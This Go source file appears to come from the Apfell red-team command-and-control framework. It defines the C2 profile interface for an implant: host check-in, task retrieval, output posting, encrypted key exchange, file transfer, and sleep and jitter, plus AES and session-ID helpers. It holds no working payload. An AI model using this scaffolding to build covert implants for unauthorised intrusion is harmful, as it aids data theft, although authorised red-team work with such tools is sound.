package profiles

import (
	"encoding/base64"
	"encoding/json"
	"math/rand"
	"pkg/utils/crypto"
	"pkg/utils/structs"
	"time"
)

var (
	ApiVersion                 = "1.4"
	seededRand      *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	UUID                       = "UUID_HERE"
	TaskResponses   []json.RawMessage
	UploadResponses []json.RawMessage
)

//Profile - Primary interface for apfell C2 profiles
type Profile interface {
	CheckIn(ip string, pid int, user string, host string, os string, arch string) interface{} // CheckIn method for sending the initial checkin to the server
	GetTasking() interface{}                                                                  // GetTasking method for retrieving the next task from apfell
	PostResponse(output []byte, skipChunking bool) []byte                                     // Post a task response to the server
	NegotiateKey() string                                                                     // Start EKE key negotiation for encrypted comms
	SendFile(task structs.Task, params string, ch chan []byte)                                // C2 profile implementation for downloading files
	GetFile(task structs.Task, fileDetails structs.FileUploadParams, ch chan []byte)          // C2 Profile implementation to get a file with specified id // C2 profile helper function to retrieve any arbitrary value for a profile
	SendFileChunks(task structs.Task, data []byte, ch chan []byte)                            // C2 helper function to upload a file
	SleepInterval() int
	SetSleepInterval(interval int)
	SetSleepJitter(jitter int)
	ApfID() string
	SetApfellID(newID string)
	ProfileType() string
}

func NewInstance() interface{} {
	return newProfile()
}

func EncryptMessage(msg []byte, k string) []byte {
	key, _ := base64.StdEncoding.DecodeString(k)
	return crypto.AesEncrypt(key, msg)
}

func DecryptMessage(msg []byte, k string) []byte {
	key, _ := base64.StdEncoding.DecodeString(k)
	return crypto.AesDecrypt(key, msg)
}

func GenerateSessionID() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 20)
	for i := range b {
		b[i] = letterBytes[seededRand.Intn(len(letterBytes))]
	}
	return string(b)
}
